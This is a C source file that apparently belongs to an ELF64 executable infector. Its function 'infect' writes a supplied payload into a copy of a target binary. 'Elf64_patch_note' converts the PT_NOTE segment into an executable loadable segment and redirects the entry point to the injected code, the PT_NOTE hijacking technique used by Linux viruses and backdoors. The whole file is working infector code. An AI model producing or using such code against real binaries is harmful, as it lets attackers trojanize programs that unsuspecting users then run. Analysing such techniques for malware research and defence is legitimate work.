
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "elf64_patch.h"
#include "elf64_payload.h"
#include "types.h"
#include "retcodes.h"
#include "elf64_shr.h"
#include "elf64_phr.h"


void infect(ELF *bin, unsigned char *payload, Elf64_Off offset, Elf64_Half pl_size, 
					Elf64_Off nxtp_off, char *out_fname) {
	FILE *target = fopen(out_fname, "w");
	size_t i;
	unsigned char byte;
	fseek(bin->file, 0L, SEEK_SET);
	for (i = 0; i < offset; i++) {
		fread(&byte, 1, 1, bin->file);
		fwrite(&byte, 1, 1, target);
	}
	for (i = 0; i < pl_size; i++) {
		fwrite(payload + i, 1, 1, target);
	}
	fseek(bin->file, nxtp_off, SEEK_SET);
	while (fread(&byte, 1, 1, bin->file) == 1)
		fwrite(&byte, 1, 1, target);
	/* Modify entry point */
	Elf64_write_ehr(target, bin->ehr);
	/* Modify section size */
	Elf64_write_shr_all(target, bin->shr, bin->ehr->e_shnum, bin->ehr->e_shoff, bin->ehr->e_shentsize);
	Elf64_write_phr_all(target, bin->phr, bin->ehr->e_phnum, bin->ehr->e_phoff, bin->ehr->e_phentsize);
	fclose(target);
	return;
}

void Elf64_patch_note(ELF *bin, unsigned char *pl, Elf64_Half *pl_size, char *out_fname) {
	// TODO if no pnote (ie NULL)
	Elf64_Phdr *pnote = Elf64_get_pnote(bin);
	if (*pl_size > pnote->p_filesz) {
		printf("ERROR: payload is too large to fit in Note section \
		(not implemented yet)\n");
		exit(EXIT_NOT_IMPLEMENTED);
	}
	pl = pad_payload(pl, pl_size, pnote->p_filesz, 0x00);
	// TODO if no pcode (ie NULL)
	Elf64_Phdr *pcode = Elf64_get_pcode(bin);
	pnote->p_type = PT_LOAD;
	pnote->p_flags = pcode->p_flags;
	bin->ehr->e_entry = pnote->p_vaddr;
	infect(bin, pl, pnote->p_offset, *pl_size, pnote->p_offset + pnote->p_filesz, out_fname);
	return;
}
